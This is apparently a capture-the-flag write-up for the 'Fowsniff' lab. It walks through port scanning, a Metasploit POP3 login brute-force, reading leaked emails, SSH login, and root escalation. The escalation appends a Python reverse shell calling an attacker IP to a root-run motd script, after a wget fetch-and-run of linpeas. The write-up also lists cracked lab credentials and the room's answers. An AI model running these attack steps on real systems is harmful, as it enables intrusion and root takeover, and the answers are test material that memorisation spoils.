# Fowsniff CTF - Easy

```shell
rustscan -a 10.10.85.61 --range 0-65535 --ulimit 5000

gobuster dir -u http://10.10.85.61 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

msfconsole

search pop3
#we can use the login module

use auxiliary/scanner/pop3/pop3_login

set PASSWORD scoobydoo2

set RHOSTS 10.10.85.61

set USERNAME seina

run
#this shows success
#now we can log into pop3 using nc

nc 10.10.85.61 110
#enter creds

USER seina

PASS scoobydoo2

STAT
#view no. of messages

LIST
#view message ID

RETR 1
#show 1st email

RETR 2
#show 2nd email

QUIT

ssh seina@10.10.85.61
#this does not work so we will use other users

ssh baksteen@10.10.85.61
#this works

id
#we belong to group 'users'

#we can try to check for privesc now

#on attacker machine
python3 -m http.server

#on victim machine ssh
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#this can give us an idea about privesc

#following the hint of cube.sh
find / -name cube.sh 2>/dev/null

ls -la /opt/cube/cube.sh

echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.14.31.212,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" >> /opt/cube/cube.sh
#add given Python reverse-shell to script

cat /opt/cube/cube.sh

ls -la /etc/update-motd.d/

cat /etc/update-motd.d/00-header
#we can see that this script is run by root
#and contains cube.sh

nc -lvnp 1234
#setup listener on attacker machine

#now we need to logout and login to SSH
```

```markdown
Open ports & services:

  * 22 - ssh
  * 80 - http
  * 110 - pop3
  * 143 - imap

Using Gobuster to scan website, we get the following directories:

  * /assets
  * /images
  * /index.html
  * /LICENSE.txt
  * /README.txt
  * /robots.txt
  * /security.txt

As given, we can also Google about the website, that is, Fowsniff Corp.

We get to know that they have been hacked by B1gN1nj4.

We also find a password dump for their email service, which contains md5 hashes for the same; we can crack the required hashes using online services such as Crackstation.

It is also shown that stone@fowsniff is the sysadmin of the website.

After cracking all the hashes, we get these cleartext credentials for the email services:

  * mauer@fowsniff:mailcall
  * mustikka@fowsniff:bilbo101
  * tegel@fowsniff:apples01
  * baksteen@fowsniff:skyler22
  * seina@fowsniff:scoobydoo2
  * mursten@fowsniff:carp4ever
  * parede@fowsniff:orlando12
  * sciana@fowsniff:07011972

We are able to get creds for everyone except the sysadmin.

Now, as given, we will use Metasploit to bruteforce pop3 login and connect to the service with seina's creds.

After running the exploit, we can see that the server authenticates the creds seina:scoobydoo2

We can use these creds to actually log into the pop3 service then; we can use nc or telnet for this.

After viewing the emails, we get some critical information from one of the emails.

First email from stone (sysadmin) is about the security incident; it also contains the temporary SSH password 'S1ck3nBluff+secureshell'.

We can use this SSH password to connect to the machine from one of the users mentioned in the email.

After logging into SSH, we can start checking for privesc vectors.

The hint shows a file called cube.sh, so we can look for it.

We can see that this script has read-write-execute permissions granted for this 'users' group; so we can modify this script and execute it to get reverse shell.

We can also see from the given reference that the cube.sh script is included and run from the /etc/update-motd.d/00-header file, which prints the banner shown during SSH login.

Following this, we need to logout and log into SSH session again, this will give us root reverse shell on our listener.
```

1. What was seina's password to the email service? - scoobydoo2

2. Looking through her emails, what was a temporary password set for her? - S1ck3nBluff+secureshell
